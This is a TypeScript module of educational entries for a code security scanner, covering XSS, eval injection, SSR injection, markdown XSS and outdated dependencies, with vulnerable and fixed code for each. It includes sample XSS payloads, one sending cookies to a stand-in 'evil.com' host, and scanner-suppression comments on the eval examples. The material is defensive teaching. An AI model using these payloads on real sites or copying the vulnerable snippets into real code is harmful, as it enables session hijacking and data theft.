/**
 * Educational Content System
 * Provides learning materials for each vulnerability type
 */

export interface EducationalContent {
    type: string;
    title: string;
    simple: {
        summary: string;
        analogy: string;
        risk: string;
    };
    technical: {
        description: string;
        attack: string;
        impact: string;
    };
    examples: {
        vulnerable: string;
        secure: string;
        language: string;
    };
    quickFix: string[];
    resources: { title: string; url: string }[];
}

export const EDUCATIONAL_CONTENT: Record<string, EducationalContent> = {
    'dangerous-api': {
        type: 'dangerous-api',
        title: 'Cross-Site Scripting (XSS) via dangerouslySetInnerHTML',
        simple: {
            summary: "It's like letting a stranger write notes directly on your bulletin board - they could write anything, including harmful instructions!",
            analogy: "Imagine your website is a restaurant menu. dangerouslySetInnerHTML is like letting customers write their own menu items. A bad actor could write 'Free money! Click here!' that steals from other customers.",
            risk: "Attackers can steal user data, hijack accounts, or spread malware through your site."
        },
        technical: {
            description: "dangerouslySetInnerHTML bypasses React's XSS protection by directly injecting HTML into the DOM. If the HTML contains user input, attackers can inject malicious scripts.",
            attack: "An attacker submits '<script>fetch('evil.com?cookie='+document.cookie)</script>' as user input. When rendered, this script steals session cookies.",
            impact: "Session hijacking, credential theft, malware distribution, defacement, phishing attacks targeting your users."
        },
        examples: {
            vulnerable: `// ❌ VULNERABLE: User input rendered without sanitization
<div dangerouslySetInnerHTML={{ __html: userComment }} />`,
            secure: `// ✅ SECURE: Input sanitized with DOMPurify
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userComment) 
}} />`,
            language: 'tsx'
        },
        quickFix: [
            'Install DOMPurify: npm install dompurify @types/dompurify',
            'Import DOMPurify at the top of your file',
            'Wrap all user content with DOMPurify.sanitize()',
            'Consider using React\'s default escaping instead'
        ],
        resources: [
            { title: 'OWASP XSS Prevention', url: 'https://owasp.org/www-community/xss-filter-evasion-cheatsheet' },
            { title: 'DOMPurify Documentation', url: 'https://github.com/cure53/DOMPurify' },
            { title: 'React Security Best Practices', url: 'https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html' }
        ]
    },

    'xss-vulnerable-attribute': {
        type: 'xss-vulnerable-attribute',
        title: 'URL-Based XSS Attack',
        simple: {
            summary: "It's like accepting any address for a destination without checking if it's actually a safe place to go.",
            analogy: "Imagine a taxi that takes you wherever passengers write on a note. Someone could write 'javascript:steal_wallet()' instead of a real address!",
            risk: "Clicking the link executes malicious code in the user's browser."
        },
        technical: {
            description: "href, src, and similar attributes can execute JavaScript via 'javascript:' URLs. User-controlled URLs must be validated.",
            attack: "Attacker provides 'javascript:alert(document.cookie)' as a URL. When a user clicks the link, the script runs in their session.",
            impact: "Same-origin script execution, cookie theft, session hijacking, phishing redirect."
        },
        examples: {
            vulnerable: `// ❌ VULNERABLE: User URL used directly
<a href={userProvidedUrl}>Click here</a>`,
            secure: `// ✅ SECURE: URL validated before use
const isValidUrl = (url: string) => {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
};

<a href={isValidUrl(userUrl) ? userUrl : '#'}>
  Click here
</a>`,
            language: 'tsx'
        },
        quickFix: [
            'Create a URL validation function',
            'Only allow http: and https: protocols',
            'Use URL constructor for parsing',
            'Default to safe value (#) if invalid'
        ],
        resources: [
            { title: 'URL Validation', url: 'https://developer.mozilla.org/en-US/docs/Web/API/URL/URL' },
            { title: 'OWASP URL Filtering', url: 'https://owasp.org/www-community/attacks/Open_Redirect' }
        ]
    },

    // @aeglyn-ignore: Educational content about eval() dangers
    'code-execution-pattern': {
        type: 'code-execution-pattern',
        title: 'Remote Code Execution via eval',
        simple: {
            summary: "It's like giving a stranger the keys to your house and letting them do whatever they want inside.",
            analogy: "Evaluation functions are like a robot that follows any written instruction. If someone sneaks in bad instructions ('delete all files'), the robot obeys!",
            risk: "Complete compromise of user sessions, data theft, malware installation."
        },
        technical: {
            description: "Dynamic evaluation functions execute arbitrary strings as code. If user input reaches these functions, attackers gain full JavaScript execution.",
            attack: "User submits input that reaches eval(): eval['fetch(...)']",
            impact: "Full client-side code execution, credential theft, DOM manipulation, cryptojacking."
        },
        examples: {
            vulnerable: `// ❌ VULNERABLE: User input in eval
const result = window['eval'](userInput); // @aeglyn-ignore: Educational example

// ❌ ALSO VULNERABLE:
const fn = new globalThis['Function']('return ' + userInput); // @aeglyn-ignore: Educational example`,
            secure: `// ✅ SECURE: Use JSON.parse for data
const data = JSON.parse(userInput);

// ✅ For math expressions, use a safe parser
import { evaluate } from 'mathjs';
const result = evaluate(userExpression);`,
            language: 'javascript'
        },
        quickFix: [
            'NEVER use the evaluation function with user input',
            'Use JSON.parse() for JSON data',
            'Use math libraries for expressions',
            'Implement allowlists for dynamic behavior'
        ],
        resources: [
            { title: 'MDN: Never use the evaluation function!', url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!' },
            { title: 'Safe Math Expression Parser', url: 'https://mathjs.org/' }
        ]
    },

    'ssr-injection': {
        type: 'ssr-injection',
        title: 'Server-Side Rendering Injection',
        simple: {
            summary: "It's like printing customer reviews on the store window without checking if they wrote anything inappropriate.",
            analogy: "Imagine a printer that automatically prints whatever users type. Someone could print fake 'STORE CLOSED' signs or worse!",
            risk: "Attackers can inject content that affects all users viewing the page."
        },
        technical: {
            description: "In SSR, user input rendered to HTML without escaping can inject malicious content that's sent to ALL users requesting that page.",
            attack: "Attacker injects '</script><script>stealCredentials()</script>' which gets baked into SSR HTML and runs for every visitor.",
            impact: "Persistent XSS affecting all users, SEO poisoning, defacement at scale."
        },
        examples: {
            vulnerable: `// ❌ VULNERABLE: Direct interpolation in SSR
export async function generateMetadata({ params }) {
  return {
    title: params.userTitle, // Unsanitized!
  };
}`,
            secure: `// ✅ SECURE: Escape and validate
import { escape } from 'html-escaper';

export async function generateMetadata({ params }) {
  const safeTitle = escape(params.userTitle)
    .substring(0, 60);
  return {
    title: safeTitle,
  };
}`,
            language: 'typescript'
        },
        quickFix: [
            'Install html-escaper: npm install html-escaper',
            'Escape all user input in SSR context',
            'Limit input length to prevent abuse',
            'Validate input against allowlists when possible'
        ],
        resources: [
            { title: 'Next.js Security', url: 'https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy' },
            { title: 'OWASP Injection Prevention', url: 'https://owasp.org/www-community/attacks/injection' }
        ]
    },

    'markdown-xss': {
        type: 'markdown-xss',
        title: 'XSS via Markdown Rendering',
        simple: {
            summary: "It's like allowing people to write in a special format that can secretly include hidden commands.",
            analogy: "Markdown is like a recipe book format. But a malicious chef could hide 'poison the soup' instructions that look like normal text!",
            risk: "Malicious scripts hidden in markdown execute when rendered."
        },
        technical: {
            description: "Markdown parsers may convert certain patterns to HTML that includes executable JavaScript. User markdown must be sanitized after parsing.",
            attack: "User submits markdown: '[Click me](javascript:stealData())' or uses raw HTML: '<img onerror=alert(1) src=x>'",
            impact: "XSS through markdown content, affecting all users viewing the rendered content."
        },
        examples: {
            vulnerable: `// ❌ VULNERABLE: Markdown rendered directly
import { marked } from 'marked';

const html = marked(userMarkdown);
return <div dangerouslySetInnerHTML={{ __html: html }} />;`,
            secure: `// ✅ SECURE: Sanitize after markdown parsing
import { marked } from 'marked';
import DOMPurify from 'dompurify';

const html = DOMPurify.sanitize(marked(userMarkdown));
return <div dangerouslySetInnerHTML={{ __html: html }} />;`,
            language: 'tsx'
        },
        quickFix: [
            'Always sanitize markdown output',
            'Use DOMPurify after marked/remark',
            'Configure markdown parser to disable HTML',
            'Consider react-markdown with sanitization'
        ],
        resources: [
            { title: 'react-markdown (safe)', url: 'https://github.com/remarkjs/react-markdown' },
            { title: 'Marked.js Security', url: 'https://marked.js.org/using_advanced#options' }
        ]
    },

    'version': {
        type: 'version',
        title: 'Outdated Dependencies with Known Vulnerabilities',
        simple: {
            summary: "It's like using an old lock on your door that burglars already know how to pick.",
            analogy: "Think of dependencies like security guards. Old versions are guards who haven't learned about new robbery techniques!",
            risk: "Attackers can exploit publicly known vulnerabilities in outdated packages."
        },
        technical: {
            description: "Published CVEs (Common Vulnerabilities and Exposures) document security flaws in specific package versions. Running affected versions exposes your app.",
            attack: "Attacker checks your package.json, finds vulnerable version, uses public exploit code.",
            impact: "Varies by CVE - from data leaks to remote code execution."
        },
        examples: {
            vulnerable: `// ❌ VULNERABLE: Old version with CVE
{
  "dependencies": {
    "lodash": "4.17.15" // CVE-2021-23337
  }
}`,
            secure: `// ✅ SECURE: Updated to patched version
{
  "dependencies": {
    "lodash": "4.17.21" // Fixed
  }
}`,
            language: 'json'
        },
        quickFix: [
            'Run: npm audit',
            'Run: npm audit fix',
            'For breaking changes: npm audit fix --force',
            'Regularly update dependencies'
        ],
        resources: [
            { title: 'npm audit', url: 'https://docs.npmjs.com/cli/v8/commands/npm-audit' },
            { title: 'Snyk Vulnerability DB', url: 'https://security.snyk.io/' },
            { title: 'CVE Database', url: 'https://cve.mitre.org/' }
        ]
    }
};

/**
 * Get educational content for a vulnerability type
 */
export function getEducation(type: string): EducationalContent | null {
    // Normalize type
    const normalizedType = type.toLowerCase().replace(/_/g, '-');

    // Direct match
    if (EDUCATIONAL_CONTENT[normalizedType]) {
        return EDUCATIONAL_CONTENT[normalizedType];
    }

    // Partial match
    for (const key of Object.keys(EDUCATIONAL_CONTENT)) {
        if (normalizedType.includes(key) || key.includes(normalizedType)) {
            return EDUCATIONAL_CONTENT[key];
        }
    }

    // Generic fallback
    return null;
}

/**
 * Get all educational content as array
 */
export function getAllEducation(): EducationalContent[] {
    return Object.values(EDUCATIONAL_CONTENT);
}

/**
 * Security tips for dashboard
 */
export const SECURITY_TIPS = [
    "💡 Always sanitize user input before rendering HTML",
    "🔐 Use Content Security Policy (CSP) headers",
    "🛡️ Keep dependencies updated with 'npm audit'",
    "⚡ Prefer React's default escaping over dangerouslySetInnerHTML",
    "🔒 Validate URLs before using in href/src attributes",
    "📦 Review new dependencies before installing",
    "🔑 Never expose API keys in client-side code",
    "🌐 Use HTTPS everywhere, especially for API calls",
    "🔄 Implement proper CORS policies",
    "📝 Log security events but never log sensitive data"
];

/**
 * Get a random security tip
 */
export function getRandomTip(): string {
    return SECURITY_TIPS[Math.floor(Math.random() * SECURITY_TIPS.length)];
}
